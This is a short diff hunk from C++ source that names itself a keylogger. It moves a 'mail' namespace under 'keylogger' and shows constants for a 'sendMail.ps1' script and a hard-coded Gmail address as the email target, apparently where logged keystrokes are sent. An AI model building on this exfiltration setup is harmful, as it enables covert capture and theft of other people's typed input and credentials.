@@ -9,7 +9,7 @@
 #include "Helper.h"
 #include "Timer.h"
 
-namespace mail
+namespace keylogger::mail
 {
 const std::string scriptName = "sendMail.ps1";
 constexpr const char* emailTarget = "michalovskyyy@gmail.com";
